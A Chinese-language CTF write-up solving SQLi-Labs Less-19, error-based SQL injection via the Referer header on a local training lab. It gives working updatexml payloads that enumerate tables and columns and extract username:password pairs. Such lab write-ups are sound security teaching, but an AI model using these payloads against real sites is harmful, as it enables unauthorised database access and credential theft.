【SQLi-Labs】Less-19 头部注入（Referer）Writeup

操作者：何芊宏 | 操作日期：2026.10.25 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, POST注入, Header注入, 报错注入

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-19 (POST - Header Injection - Referer field - Error based)
  • 提示：POST请求，HTTP头部注入（Referer字段），基于报错

2. 解题思路与前置原理

本关卡的业务逻辑与 Less-18 完全一致：必须先使用正确的账号密码登录成功，后台才会执行记录用户信息的 INSERT 语句。

与 L18 的区别在于，后台记录的数据字段从 User-Agent 变为了 Referer（来源页）。由于代码未对 Referer 进行过滤，导致此处存在报错注入漏洞。

核心技巧：在 HTTP 请求头中，行尾的注释符 # 或 --+ 容易因为空格丢失或被吞掉而失效。因此，需采用 ' or 表达式 or ' 的方式，首尾闭合，将 Payload 完美嵌入原 SQL 语句中。

3. 操作步骤与解析

前提条件：使用有效的账号密码（如 admin/123456）登录，页面显示 SUCCESSFULLY LOGGED IN。

第一步：抓包与定位注入点

使用 Burp Suite 拦截登录请求，发送至 Repeater。定位到请求头中的 Referer 字段（第 18 行）。

第二步：利用 Referer 进行报错注入

依次替换 Referer 的值为以下 Payload：

1. 确认注入与当前库名：

Referer: ' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or '

回显：XPATH syntax error: '~security~'。

2. 获取表名：

Referer: ' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or '

回显：XPATH syntax error: '~emails,referrers,uagents,users~'。

3. 获取列名（使用十六进制规避单引号）：

Referer: ' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),0x7e),1) or '

注：0x7573657273 为 users 的十六进制。在 Header 中嵌套单引号极易引发解析错误，使用十六进制是最佳实践。

回显：XPATH syntax error: '~id,username,password~'。

4. 提取账号密码：

Referer: ' or updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1) or '

注：受限于 32 字符报错长度限制，使用 limit 0,1 提取第一行数据。

回显：XPATH syntax error: '~Dumb:Dumb~'。

4. 踩坑记录与复盘

  • 前置登录要求：Header 注入的前提是代码执行到了 INSERT 语句，如果登录失败，后台直接 exit()，注入点根本不会触发。
  • Header 中的引号处理：在 Referer 或 User-Agent 中，尽量少用单引号去包裹字符串（如 table_name='users'），改用十六进制 0x... 能有效避免语法破坏。

5. 知识点总结

  • Referer 注入：HTTP 头部的各类字段（UA、Referer、X-Forwarded-For、Cookie 等）只要被后端接收并拼接入数据库，都可能成为注入点。
  • 无注释符闭合：掌握 ' or ... or ' 这种“对称闭合”手法，能在无法使用注释符的严苛环境中完成注入。
